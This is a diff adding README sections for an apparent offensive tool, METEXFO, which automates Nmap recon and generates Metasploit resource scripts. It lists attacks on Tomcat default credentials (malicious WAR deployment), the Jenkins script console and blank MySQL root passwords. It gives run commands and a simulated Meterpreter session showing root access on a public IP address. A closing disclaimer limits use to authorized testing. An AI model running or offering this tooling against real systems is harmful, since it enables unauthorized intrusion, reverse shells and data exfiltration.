@@ -90,4 +90,55 @@ The automation pipeline operates as follows:
 3. **Payload Construction (RC Compiler):** Generates ready-to-fire Metasploit resource macros (`.rc`) tailored exactly to the target's open doors.
 
 ### 💀 Vector Capabilities & Attack Vectors
+* **Apache Tomcat (Port 8080):** Targets left-behind default manager credentials (`admin:admin`, `tomcat:tomcat`). Once authenticated, it enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
+* **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated or legacy continuous integration setups. Leverages the build-in script terminal to spawn system shells.
+* **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists, tables, and credentials.
 
+### 🚀 Usage
+```bash
+# Clone & Requirements
+git clone https://github.com
+cd METEXFO
+pip3 install python-nmap colorama
+
+# Phase 1: Recon & RC Blueprint Generation
+python3 mme12.py -t <TARGET_IP> -l <YOUR_LHOST> --lang en
+
+# Phase 2: Fire the Automation via Metasploit
+msfconsole -q -r metexfo_final_agent.rc
+```
+
+### ⚡ Post-Exploitation Terminal Output Preview (Success Simulation)
+When the compiled blueprint runs against an unhardened architecture and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:
+
+```text
+resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
+resource (metexfo_final_agent.rc)> set RPORT 8080
+resource (metexfo_final_agent.rc)> run
+[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
+[*] Auxiliary module execution completed
+
+[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
+[*] Sending stage (175641 bytes) to 193.255.45.112
+[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
+
+meterpreter > sysinfo
+Computer        : VICTIM-SERVER-01
+OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
+Architecture    : x64
+
+meterpreter > getuid
+Server username: root
+
+meterpreter > _
+```
+
+---
+
+## ⚖️ Yasal Uyarı / Disclaimer
+**TR:** Bu araç yalnızca yasal sızma testleri ve eğitim faaliyetleri amacıyla geliştirilmiştir. İzin alınmamış hedef sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Kullanıcı, aracın kullanımından doğabilecek tüm hukuki sonuçlardan kendisi sorumludur.
+
+**EN:** This software is strictly developed for authorized penetration testing, security auditing, and educational practices. Unauthorized deployment against remote infrastructure is highly illegal and carries strict judicial consequences.
+
+**Developer:** `GHOST0X02` | **Version:** `5.0-Elite`
